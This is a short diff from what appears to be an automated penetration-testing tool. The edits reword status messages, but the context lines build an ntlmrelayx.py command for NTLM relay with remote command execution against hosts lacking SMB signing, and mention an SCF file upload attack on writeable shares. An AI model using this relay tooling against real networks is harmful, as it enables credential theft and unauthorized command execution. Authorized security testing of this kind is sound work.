@@ -814,7 +814,6 @@ def run_relay_attack(iface, args):
         relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
                      ' -of hashes/ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt -wa 3 -c "{}"'.format(remote_cmd))
     else:
-        print_bad('No hosts with SMB signing disabled; SMB relay for command execution will not work although you may still capture hashes')
         relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
                      ' -of hashes/ntlmrelay-hashes -wa 3 -c "{}"'.format(remote_cmd))
     ntlmrelay_proc = run_proc(relay_cmd)
@@ -1280,9 +1279,9 @@ def main(report, args):
         # ATTACK 2: SCF file upload to writeable shares
         smb_hosts_found = parse_nse(hosts, args, iface)
         if smb_hosts_found == False:
-            print_bad('No hosts with SMB port 445 open')
+            print_bad('No hosts with SMB signing disabled')
             if 'relay' not in args.skip.lower():
-                print_bad('SMB Relay Attack 4 will likely fail to get credentials')
+                print_bad('SMB Relay Attack 4 will fail to execute commands although it may still capture hashes')
 
     else:
         print_bad('No hosts with port 445 open. \
